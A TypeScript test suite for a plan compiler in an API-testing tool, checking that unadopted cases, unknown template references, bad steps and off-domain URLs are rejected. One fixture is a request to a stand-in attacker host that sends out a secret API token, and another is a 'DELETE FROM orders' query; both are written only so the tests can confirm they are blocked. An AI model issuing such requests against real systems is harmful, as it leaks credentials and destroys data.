/**
 * 计划编译器（03 §3.2）：全部拒绝式校验——宁可跑不起来，不可跑出错的结果。
 */

import { describe, expect, it } from 'vitest';
import { compilePlan } from '../src/execution/plan-compiler.ts';
import type { EnvRecord, RunPolicy, TestCaseRecord } from '../src/kernel/shared/domain.ts';
import { defaultRunPolicy } from '../src/kernel/shared/domain.ts';

const ENV: EnvRecord = {
  id: 1,
  projectId: 1,
  name: 'staging',
  baseUrl: 'http://127.0.0.1:36211',
  variables: { region: 'cn-north' },
  secretNames: ['apiToken'],
  headers: {},
  allowSelfSigned: false,
  createdAtMs: 0,
};

const POLICY: RunPolicy = defaultRunPolicy();

function caseOf(overrides: Partial<TestCaseRecord> = {}): TestCaseRecord {
  return {
    id: 1,
    projectId: 1,
    name: 'c',
    description: null,
    routeId: null,
    status: 'adopted',
    paramKind: 'single',
    steps: [{ id: 's0', seq: 0, kind: 'request', config: { method: 'GET', url: '/orders' } }],
    params: { kind: 'single', rows: [{ label: 'baseline', values: {}, intent: 'baseline' }] },
    provenance: { principles: [], samples: [], agentSession: null, agentTurn: null },
    policyOverride: null,
    tags: [],
    proposedBy: 'fx-agent',
    reviewedBy: 'kel',
    reviewedAtMs: 1,
    diff: null,
    createdAtMs: 0,
    ...overrides,
  };
}

async function compile(cases: TestCaseRecord[], env = ENV) {
  return compilePlan({ cases, env, policy: POLICY, seed: 1, nowMs: 0 });
}

describe('计划编译器', () => {
  it('编译通过：entryId / 分组 / 快照', async () => {
    const c = caseOf({
      params: {
        kind: 'boundary',
        rows: [
          { label: '低边界', values: { amount: 49999 }, intent: 'boundary_low' },
          { label: '超限', values: { amount: 50001 }, intent: 'boundary_high' },
        ],
      },
    });
    const plan = await compile([c]);
    expect(plan.entries.map((e) => e.entryId)).toEqual(['1#0', '1#1']);
    expect(plan.entries.every((e) => e.group === 'case:1')).toBe(true); // 同 case 串行
    expect(plan.entries[0]!.paramValues).toEqual({ amount: 49999 });
    expect(plan.entries[0]!.steps[0]!.kind).toBe('request');
    expect(plan.source.caseIds).toEqual([1]);
  });

  it('拒绝：未 adopted 的用例（P3：AI 提议不该被打出去）', async () => {
    await expect(compile([caseOf({ status: 'proposed' })])).rejects.toMatchObject({ code: 'case_not_adopted' });
  });

  it('拒绝：var 引用未被更早的 extract 定义', async () => {
    const c = caseOf({
      steps: [
        { id: 's0', seq: 0, kind: 'request', config: { method: 'GET', url: '/orders' } },
        { id: 's1', seq: 1, kind: 'request', config: { method: 'GET', url: '/orders/{{var.oid}}' } },
      ],
    });
    await expect(compile([c])).rejects.toMatchObject({ code: 'template_ref_unknown' });
  });

  it('通过：var 引用由更早的 extract 定义', async () => {
    const c = caseOf({
      steps: [
        { id: 's0', seq: 0, kind: 'request', config: { method: 'POST', url: '/orders' } },
        { id: 's1', seq: 1, kind: 'extract', config: { name: 'oid', from: { kind: 'body_json', path: 'data.id' } } },
        { id: 's2', seq: 2, kind: 'request', config: { method: 'GET', url: '/orders/{{var.oid}}' } },
      ],
    });
    await expect(compile([c])).resolves.toBeTruthy();
  });

  it('拒绝：未知 env/secret/param 引用', async () => {
    await expect(
      compile([caseOf({ steps: [{ id: 's', seq: 0, kind: 'request', config: { method: 'GET', url: '/x?r={{env.nope}}' } }] })]),
    ).rejects.toMatchObject({ code: 'template_ref_unknown' });
    await expect(
      compile([caseOf({ steps: [{ id: 's', seq: 0, kind: 'request', config: { method: 'GET', url: '/x?t={{secret.nope}}' } }] })]),
    ).rejects.toMatchObject({ code: 'template_ref_unknown' });
    await expect(
      compile([caseOf({ steps: [{ id: 's', seq: 0, kind: 'request', config: { method: 'GET', url: '/x?p={{param.nope}}' } }] })]),
    ).rejects.toMatchObject({ code: 'template_ref_unknown' });
  });

  it('拒绝：目标 URL 在 env 域名之外（07 §3.3 防注入用例）', async () => {
    await expect(
      compile([caseOf({ steps: [{ id: 's', seq: 0, kind: 'request', config: { method: 'GET', url: 'http://evil.example.com/steal?x={{secret.apiToken}}' } }] })]),
    ).rejects.toMatchObject({ code: 'url_outside_env' });
    // 环境外 IP 同样拒绝
    await expect(
      compile([caseOf({ steps: [{ id: 's', seq: 0, kind: 'request', config: { method: 'GET', url: 'http://10.9.9.9:6666/x' } }] })]),
    ).rejects.toMatchObject({ code: 'url_outside_env' });
  });

  it('db_check：缺 connection/expectRows 或写语句 → 拒绝（编译期白名单）', async () => {
    await expect(
      compile([caseOf({ steps: [{ id: 's', seq: 0, kind: 'db_check', config: { query: 'SELECT 1' } }] })]),
    ).rejects.toMatchObject({ code: 'step_invalid' });
    // 合法 db_check 编译通过（运行期连接解析与二次白名单见 sampling 测试）
    const ok = await compile([caseOf({ steps: [{ id: 's', seq: 0, kind: 'db_check', config: { connection: 'appdb', query: 'SELECT COUNT(*) AS n FROM orders', expectRows: { eq: 1 } } }] })]);
    expect(ok.entries[0]!.steps[0]!.kind).toBe('db_check');
    await expect(
      compile([caseOf({ steps: [{ id: 's', seq: 0, kind: 'db_check', config: { connection: 'appdb', query: 'DELETE FROM orders', expectRows: { eq: 0 } } }] })]),
    ).rejects.toMatchObject({ code: 'step_invalid' });
  });

  it('拒绝：matrix 超 maxRows', async () => {
    const rows = Array.from({ length: 5 }, (_, i) => ({ label: `r${i}`, values: {}, intent: 'baseline' as const }));
    await expect(
      compile([caseOf({ paramKind: 'matrix', params: { kind: 'matrix', rows, maxRows: 3 } })]),
    ).rejects.toMatchObject({ code: 'matrix_rows_exceeded' });
  });

  it('拒绝：baseUrl 非法', async () => {
    const bad: EnvRecord = { ...ENV, baseUrl: 'gopher://x' };
    await expect(compile([caseOf()], bad)).rejects.toMatchObject({ code: 'env_url_rejected' });
  });

  it('拒绝：断言缺 expected / 未知 op / 步骤 seq 不连续', async () => {
    await expect(
      compile([caseOf({ steps: [{ id: 's', seq: 0, kind: 'request', config: { method: 'GET', url: '/' } }, { id: 's1', seq: 1, kind: 'assert', config: { target: { kind: 'status' }, op: 'eq' } }] })]),
    ).rejects.toMatchObject({ code: 'step_invalid' });
    await expect(
      compile([caseOf({ steps: [{ id: 's', seq: 0, kind: 'assert', config: { target: { kind: 'status' }, op: 'explode', expected: '1' } }] })]),
    ).rejects.toMatchObject({ code: 'step_invalid' });
    await expect(
      compile([caseOf({ steps: [{ id: 's', seq: 3, kind: 'request', config: { method: 'GET', url: '/' } }] })]),
    ).rejects.toMatchObject({ code: 'steps_invalid' });
  });

  it('secret 引用存在即通过（值不进计划——快照里只有名字）', async () => {
    const plan = await compile([
      caseOf({ steps: [{ id: 's', seq: 0, kind: 'request', config: { method: 'GET', url: '/x?t={{secret.apiToken}}' } }] }),
    ]);
    expect(JSON.stringify(plan)).not.toContain('sk-'); // 无值可泄
    expect(JSON.stringify(plan)).toContain('secret.apiToken'); // 只有模板引用
  });
});
